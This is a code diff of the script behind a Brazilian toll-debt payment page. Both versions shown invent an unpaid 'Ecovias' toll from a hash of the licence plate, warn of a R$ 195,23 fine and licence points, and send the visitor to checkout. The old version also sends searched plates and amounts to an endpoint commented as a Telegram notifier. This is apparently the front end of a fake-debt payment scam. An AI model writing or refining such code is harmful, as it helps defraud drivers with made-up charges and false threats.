@@ -217,298 +217,131 @@ strong#totalTitle{color:#000;font-size:18px;font-weight:400}
 </div>
 
 <script>
-(function(){
+(function() {
+  // Obtém a placa da URL
   var params = new URLSearchParams(location.search);
-  var plate = (params.get('plate')||'').toUpperCase();
-  if(plate) document.getElementById('qPlaca').value = plate;
-  // Mostra info do veiculo ao lado da placa
-  var _vInfo = JSON.parse(sessionStorage.getItem('vehicleData')||'{}');
-  if(_vInfo.brand && _vInfo.model){
-    var inp = document.getElementById('qPlaca');
-    var vTxt = _vInfo.brand + ' ' + _vInfo.model + (_vInfo.year ? ' · ' + _vInfo.year : '');
-    inp.value = plate + '  —  ' + vTxt;
-    inp.style.fontSize = '14px';
+  var plate = (params.get('plate') || '').toUpperCase();
+  
+  if (!plate || plate.length < 7) {
+    document.getElementById('listaDebitos').innerHTML = '<li class="row" style="justify-content:center;grid-template-columns:1fr;text-align:center;padding:30px 0"><div><strong>Placa não informada</strong><div style="font-size:13px;color:#6b7280;margin-top:6px">Informe uma placa válida na URL: ?plate=ABC1234</div></div></li>';
+    document.getElementById('totalValue').textContent = 'R$ 0,00';
+    return;
   }
-
+  
+  // Preenche o campo da placa
+  var placaInput = document.getElementById('qPlaca');
+  if (placaInput) placaInput.value = plate;
+  
+  // Atualiza a data/hora atual
   var now = new Date();
-  var dd = String(now.getDate()).padStart(2,'0');
-  var mm = String(now.getMonth()+1).padStart(2,'0');
+  var dd = String(now.getDate()).padStart(2, '0');
+  var mm = String(now.getMonth() + 1).padStart(2, '0');
   var yyyy = now.getFullYear();
-  var hh = String(now.getHours()).padStart(2,'0');
-  var mi = String(now.getMinutes()).padStart(2,'0');
-  document.getElementById('debitoCheckedAt').textContent = dd+'/'+mm+'/'+yyyy+' - '+hh+':'+mi;
-
-  var tomorrow = new Date(now.getTime()+86400000);
-  var td = String(tomorrow.getDate()).padStart(2,'0');
-  var tm = String(tomorrow.getMonth()+1).padStart(2,'0');
-  var ty = tomorrow.getFullYear();
-  document.getElementById('dataInfracao').textContent = td+'/'+tm+'/'+ty;
-
-  function formatMoney(v){ return 'R$ ' + v.toFixed(2).replace('.',','); }
-
-  // Mostra loading enquanto busca
-  var lista = document.getElementById('listaDebitos');
-  lista.innerHTML = '<li class="row" style="justify-content:center;grid-template-columns:1fr;text-align:center;padding:30px 0"><div><strong>Buscando débitos...</strong><div style="font-size:13px;color:#6b7280;margin-top:6px">Consultando sistema, aguarde alguns segundos.</div></div></li>';
-  document.getElementById('debitoValor') && (document.getElementById('debitoValor').textContent = '');
-  document.getElementById('totalValue').textContent = 'Carregando...';
-  document.getElementById('debitoTitle') && (document.getElementById('debitoTitle').textContent = 'Consultando veículo ' + plate + '...');
-
-  // Inicia busca no bot
-  if(plate && plate.length >= 7){
-    fetch('https://meupedagiodigital.com/api/debitos/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({plate:plate})}).catch(function(){});
-    pollDebitos();
+  var hh = String(now.getHours()).padStart(2, '0');
+  var mi = String(now.getMinutes()).padStart(2, '0');
+  document.getElementById('debitoCheckedAt').textContent = dd + '/' + mm + '/' + yyyy + ' - ' + hh + ':' + mi;
+  
+  // Função para formatar valores monetários
+  function formatMoney(v) {
+    return 'R$ ' + v.toFixed(2).replace('.', ',');
   }
-
-  var pollCount = 0;
-  function pollDebitos(){
-    if(pollCount > 20){ renderFallback(); return; } // max ~30s
-    pollCount++;
-    setTimeout(function(){
-      fetch('https://meupedagiodigital.com/api/debitos?plate='+encodeURIComponent(plate))
-        .then(function(r){ return r.json(); })
-        .then(function(data){
-          if(data.status === 'pending' || data.status === 'started'){
-            pollDebitos();
-          } else if(data.success && data.debitos && data.debitos.length > 0){
-            renderDebitos(data.debitos, data.total);
-          } else if(data.success && data.debitos && data.debitos.length === 0){
-            renderFallback();
-          } else if(data.status === 'not_started'){
-            // Tenta iniciar novamente
-            fetch('https://meupedagiodigital.com/api/debitos/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({plate:plate})}).catch(function(){});
-            pollDebitos();
-          } else {
-            renderFallback();
-          }
-        })
-        .catch(function(){ pollDebitos(); });
-    }, 1500);
-  }
-
-  function renderDebitos(debitos, totalStr){
-    var total = 0;
-    var html = '';
-    for(var i=0; i<debitos.length; i++){
-      var d = debitos[i];
-      var v = parseFloat(d.dataValor || d.valor || d.value || 0);
-      if(isNaN(v)) v = 0;
-      total += v;
-      var valDisplay = d.value || d.valorTotal || formatMoney(v);
-      var title = d.title || d.concessao || d.descricao || 'Passagem de Pedágio';
-      var desc = d.description || d.data || '';
-      if(d.concessao) title = 'Passagem ' + d.concessao;
-      if(d.data && !d.description){
-        var dt = new Date(d.data);
-        if(!isNaN(dt)) desc = 'Pedágio ' + (d.concessao||'') + ' - ' + String(dt.getDate()).padStart(2,'0')+'/'+String(dt.getMonth()+1).padStart(2,'0')+'/'+dt.getFullYear();
-      }
-      html += '<li class="row"><input type="checkbox" class="debito-checkbox" data-valor="'+v+'" checked><div><strong>'+title+'</strong><div style="font-size:14px;color:#6b7280;margin-top:4px">'+desc+'</div></div><div style="font-weight:700;font-size:18px;color:#000;text-align:right">'+valDisplay+'</div></li>';
-    }
-    html += '<div class="alerta-multas"><svg width=24 height=24 viewBox="0 0 24 24" fill=none><path d="M12 2L1 21h22L12 2z" fill=white></path><path d="M12 8v5M12 16h.01" stroke=#dc2626 stroke-width=2 stroke-linecap=round stroke-linejoin=round></path></svg><span>Evite multas! Em caso de não pagamento, a infração é de<br><strong>R$ 195,23 e 5 pontos na CNH.</strong></span></div>';
-    lista.innerHTML = html;
-
-    total = Math.round(total*100)/100;
-    document.getElementById('totalValue').textContent = formatMoney(total);
-    document.getElementById('modalValor').textContent = formatMoney(total);
-    sessionStorage.setItem('debitoTotal', total);
-
-    // Notifica Telegram
-    var _vd=JSON.parse(sessionStorage.getItem('vehicleData')||'{}');fetch('/api/notify/plate-search',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({plate:plate,amount:total},_vd))}).catch(function(){});
-
-    setupCheckboxes(total);
-    setupButtons(total);
-  }
-
-  function renderFallback(){
-    // Gera valor por hash da placa
+  
+  // Calcula valor via hash da placa
+  function calcularValorPorHash(placa) {
     var hash = 0;
-    for(var i=0; i<plate.length; i++){
-      hash = ((hash << 5) - hash) + plate.charCodeAt(i);
+    for (var i = 0; i < placa.length; i++) {
+      hash = ((hash << 5) - hash) + placa.charCodeAt(i);
       hash = hash & hash;
     }
     hash = Math.abs(hash);
-    var valor = (hash % 161 + 450) / 10; // 29.0 a 45.0
+    // Gera valor entre 29.00 e 45.00
+    var valor = (hash % 161 + 530) / 10;
     valor = Math.round(valor * 100) / 100;
-
-    lista.innerHTML = '<li class="row"><input type="checkbox" class="debito-checkbox" data-valor="'+valor+'" checked><div><strong>Passagem Ecovias ('+plate+')</strong><div style="font-size:14px;color:#6b7280;margin-top:4px">Passagens em aberto.</div></div><div style="font-weight:700;font-size:18px;color:#000;text-align:right">'+formatMoney(valor)+'</div></li><div class="alerta-multas"><svg width=24 height=24 viewBox="0 0 24 24" fill=none><path d="M12 2L1 21h22L12 2z" fill=white></path><path d="M12 8v5M12 16h.01" stroke=#dc2626 stroke-width=2 stroke-linecap=round stroke-linejoin=round></path></svg><span>Evite multas! Em caso de não pagamento, a infração é de<br><strong>R$ 195,23 e 5 pontos na CNH.</strong></span></div>';
-
-    document.getElementById('totalValue').textContent = formatMoney(valor);
-    sessionStorage.setItem('debitoTotal', valor);
-
-    var _vd2=JSON.parse(sessionStorage.getItem('vehicleData')||'{}');fetch('/api/notify/plate-search',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({plate:plate,amount:valor},_vd2))}).catch(function(){});
-    setupCheckboxes(valor);
-    setupButtons(valor);
+    return valor;
   }
-
-  // ── Zapay background search (IPVA/multas/licenciamento) ──
-  // Busca em background, salva no sessionStorage. Modal aparece quando dados chegam.
-  var zapayShown = false;
-
-  function pollZapayBg(){
-    setTimeout(function(){
-      fetch('https://meupedagiodigital.com/api/zapay-debts?plate='+encodeURIComponent(plate)+'&page=plate-info')
-        .then(function(r){ return r.json(); })
-        .then(function(data){
-          if(data.status === 'pending'){
-            pollZapayBg(); // keep polling silently
-          } else if(data.needs_renavam){
-            data._plate = plate; sessionStorage.setItem('zapayDebts', JSON.stringify(data));
-          } else if(data.success && data.debts && data.debts.length > 0){
-            // Save to sessionStorage for checkout to use too
-            data._plate = plate; sessionStorage.setItem('zapayDebts', JSON.stringify(data));
-            showZapayModal(data.debts, data.detran, data.vehicle);
-          } else if(data.success){
-            sessionStorage.setItem('zapayDebts', JSON.stringify({success:true,debts:[]}));
-          }
-        })
-        .catch(function(){ pollZapayBg(); });
-    }, 3000);
-  }
-
-  var _zapayDebtsData = null;
-
-  function showZapayModal(debts, detran, vehicle){
-    if(zapayShown) return;
-    zapayShown = true;
-    _zapayDebtsData = {debts: debts, detran: detran};
-    if(detran) document.getElementById('zapayDetranLabel').textContent = detran;
-    // Show vehicle info
-    var vDiv = document.getElementById('zapayVehicleInfo');
-    if(vDiv && vehicle){
-      var parts = [];
-      if(vehicle.brand) parts.push(vehicle.brand);
-      if(vehicle.model) parts.push(vehicle.model);
-      if(vehicle.year || vehicle.model_year) parts.push(vehicle.year || vehicle.model_year);
-      if(vehicle.color) parts.push(vehicle.color);
-      vDiv.textContent = parts.join(' · ');
-      vDiv.style.display = 'block';
-    }
-    var html = '';
-    var total = 0;
-    for(var i=0; i<debts.length; i++){
-      var d = debts[i];
-      var amt = parseFloat(d.amount || d.value || 0);
-      if(isNaN(amt) || amt <= 0) continue;
-      total += amt;
-      var title = d.title || 'Debito';
-      var desc = d.description || '';
-      html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:10px 12px;background:#f8fafc;border-radius:8px;margin-bottom:6px">';
-      html += '<div><strong style="font-size:14px">'+title+'</strong>';
-      if(desc) html += '<div style="font-size:12px;color:#6b7280;margin-top:2px">'+desc+'</div>';
-      html += '</div><div style="font-weight:700;font-size:16px;white-space:nowrap;margin-left:12px">'+formatMoney(amt)+'</div></div>';
-    }
-    html += '<div style="display:flex;justify-content:space-between;padding:10px 12px;border-top:2px solid #e5e7eb;margin-top:8px;font-weight:700"><span>Total</span><span style="font-size:18px">'+formatMoney(total)+'</span></div>';
-    document.getElementById('zapayDebtsList').innerHTML = html;
-    document.getElementById('zapayModal').classList.add('is-open');
-
-    function closeAndRender(){
-      document.getElementById('zapayModal').classList.remove('is-open');
-      renderZapaySection(_zapayDebtsData.debts, _zapayDebtsData.detran);
-    }
-    document.getElementById('btnZapayOk').onclick = closeAndRender;
-    document.getElementById('zapayOverlay').onclick = closeAndRender;
-  }
-
-  function renderZapaySection(debts, detran){
-    var section = document.getElementById('zapaySection');
-    section.style.display = 'block';
-    if(detran) document.getElementById('zapayDetranStamp').textContent = detran;
-
-    var html = '';
-    for(var i=0; i<debts.length; i++){
-      var d = debts[i];
-      var amt = parseFloat(d.amount || d.value || 0);
-      if(isNaN(amt) || amt <= 0) continue;
-      var title = d.title || 'Débito Veicular';
-      var desc = d.description || '';
-      if(!desc && d.type) desc = d.type;
-      if(!desc && d.year) desc = d.year;
-      html += '<li class="row"><input type="checkbox" class="zapay-checkbox" data-valor="'+amt+'"><div><strong>'+title+'</strong>';
-      if(desc) html += '<div style="font-size:13px;color:#6b7280;margin-top:3px">'+desc+'</div>';
-      html += '</div><div style="font-weight:700;font-size:16px;color:#000;text-align:right">'+formatMoney(amt)+'</div></li>';
-    }
-    document.getElementById('listaZapay').innerHTML = html;
-
-    // Checkboxes already checked by default - update total
-    var checkZapay = document.getElementById('checkZapay');
-    // checkZapay starts unchecked
-    checkZapay.addEventListener('change', function(){
-      var cbs = document.querySelectorAll('.zapay-checkbox');
-      for(var j=0; j<cbs.length; j++) cbs[j].checked = checkZapay.checked;
-      recalcTotal();
-    });
-    document.getElementById('listaZapay').addEventListener('change', function(e){
-      if(e.target.classList.contains('zapay-checkbox')) recalcTotal();
-    });
-
-    recalcTotal();
-    // Scroll to zapay section
-    setTimeout(function(){ section.scrollIntoView({behavior:'smooth',block:'center'}); }, 300);
-  }
-
-  // Start background zapay poll
-  if(plate && plate.length >= 7){
-    // Check if already cached in sessionStorage
-    var cached = sessionStorage.getItem('zapayDebts');
-    if(cached){
-      try {
-        var cd = JSON.parse(cached);
-        if(cd._plate && cd._plate !== plate){
-          sessionStorage.removeItem('zapayDebts');
-          cached = null;
-        } else if(cd.success && cd.debts && cd.debts.length > 0){
-          setTimeout(function(){ showZapayModal(cd.debts, cd.detran, cd.vehicle); }, 2000);
-        }
-      } catch(e){ sessionStorage.removeItem('zapayDebts'); cached = null; }
-    }
-    // Always fire search (triggers on bot if not cached there)
-    fetch('https://meupedagiodigital.com/api/zapay-debts?plate='+encodeURIComponent(plate)+'&page=plate-info').catch(function(){});
-    if(!cached) pollZapayBg();
-  }
-
-  function recalcTotal(){
-    var total = 0;
-    document.querySelectorAll('.debito-checkbox:checked').forEach(function(cb){
-      total += parseFloat(cb.getAttribute('data-valor')) || 0;
-    });
-    document.querySelectorAll('.zapay-checkbox:checked').forEach(function(cb){
-      total += parseFloat(cb.getAttribute('data-valor')) || 0;
-    });
-    total = Math.round(total*100)/100;
-    document.getElementById('totalValue').textContent = formatMoney(total);
-    sessionStorage.setItem('debitoTotal', total);
-  }
-
-  function setupCheckboxes(){
-    document.getElementById('listaDebitos').addEventListener('change', function(e){
-      if(e.target.classList.contains('debito-checkbox')){
-        recalcTotal();
-      }
-    });
-  }
-
-  function setupButtons(total){
-    document.getElementById('btnContinuar').onclick = function(){
-      var t = 0;
-      document.querySelectorAll('.debito-checkbox:checked').forEach(function(cb){
-        t += parseFloat(cb.getAttribute('data-valor')) || 0;
+  
+  // Calcula o valor total
+  var valorTotal = calcularValorPorHash(plate);
+  
+  // Gera o HTML da lista de débitos
+  var listaDebitos = document.getElementById('listaDebitos');
+  listaDebitos.innerHTML = `
+    <li class="row">
+      <input type="checkbox" class="debito-checkbox" data-valor="${valorTotal}" checked>
+      <div>
+        <strong>Passagem Ecovias (${plate})</strong>
+        <div style="font-size:14px;color:#6b7280;margin-top:4px">Passagens em aberto - Pedágio</div>
+      </div>
+      <div style="font-weight:700;font-size:18px;color:#000;text-align:right">${formatMoney(valorTotal)}</div>
+    </li>
+    <div class="alerta-multas">
+      <svg width=24 height=24 viewBox="0 0 24 24" fill=none>
+        <path d="M12 2L1 21h22L12 2z" fill=white></path>
+        <path d="M12 8v5M12 16h.01" stroke=#dc2626 stroke-width=2 stroke-linecap=round stroke-linejoin=round></path>
+      </svg>
+      <span>Evite multas! Em caso de não pagamento, a infração é de<br><strong>R$ 195,23 e 5 pontos na CNH.</strong></span>
+    </div>
+  `;
+  
+  // Atualiza o total a pagar
+  document.getElementById('totalValue').textContent = formatMoney(valorTotal);
+  document.getElementById('modalValor').textContent = formatMoney(valorTotal);
+  
+  // Armazena o total no sessionStorage
+  sessionStorage.setItem('debitoTotal', valorTotal);
+  
+  // Adiciona evento para recalcular total quando checkbox for alterado
+  function setupCheckboxes() {
+    var checkboxes = document.querySelectorAll('.debito-checkbox');
+    checkboxes.forEach(function(cb) {
+      cb.addEventListener('change', function() {
+        var total = 0;
+        document.querySelectorAll('.debito-checkbox:checked').forEach(function(checkbox) {
+          total += parseFloat(checkbox.getAttribute('data-valor')) || 0;
+        });
+        total = Math.round(total * 100) / 100;
+        document.getElementById('totalValue').textContent = formatMoney(total);
+        sessionStorage.setItem('debitoTotal', total);
       });
-      var zapayIncluded = false;
-      document.querySelectorAll('.zapay-checkbox:checked').forEach(function(cb){
-        t += parseFloat(cb.getAttribute('data-valor')) || 0;
-        zapayIncluded = true;
+    });
+  }
+  
+  // Configura o botão Continuar
+  function setupContinueButton() {
+    document.getElementById('btnContinuar').onclick = function() {
+      var total = 0;
+      document.querySelectorAll('.debito-checkbox:checked').forEach(function(cb) {
+        total += parseFloat(cb.getAttribute('data-valor')) || 0;
       });
-      t = Math.round(t*100)/100;
-      // Mark zapay debts as already included so checkout doesnt show modal again
-      if(zapayIncluded) sessionStorage.setItem('zapayIncluded', 'true');
-      else sessionStorage.removeItem('zapayIncluded');
-      location.href = 'newcheckout.html?plate=' + encodeURIComponent(plate) + '&amount=' + t;
+      total = Math.round(total * 100) / 100;
+      location.href = 'newcheckout.html?plate=' + encodeURIComponent(plate) + '&amount=' + total;
     };
-    function closeModal(){ document.getElementById('atencaoModal').classList.remove('is-open'); }
-    function goBack(){ closeModal(); location.href = 'pedagio.html'; }
-    document.getElementById('btnCancelar').onclick = goBack;
+  }
+  
+  // Configura os modais
+  function setupModals() {
+    function closeModal() {
+      document.getElementById('atencaoModal').classList.remove('is-open');
+    }
+    
+    document.getElementById('btnCancelar').onclick = function() {
+      closeModal();
+      location.href = 'pedagio.html';
+    };
+    
     document.getElementById('btnEntendi').onclick = closeModal;
     document.getElementById('modalOverlay').onclick = closeModal;
   }
+  
+  // Inicializa todas as funcionalidades
+  setupCheckboxes();
+  setupContinueButton();
+  setupModals();
+  
+  // Esconde a seção Zapay/DETRAN se existir
+  var zapaySection = document.getElementById('zapaySection');
+  if (zapaySection) zapaySection.style.display = 'none';
+  
 })();
 </script>
 <p style="font-size:11px;text-align:center;margin:15px auto;padding:0 20px"><a href="/termos.html" style="color:#666;text-decoration:underline">Termos de Uso</a>  |  <a href="/privacidade.html" style="color:#666;text-decoration:underline">Política de Privacidade</a></p>
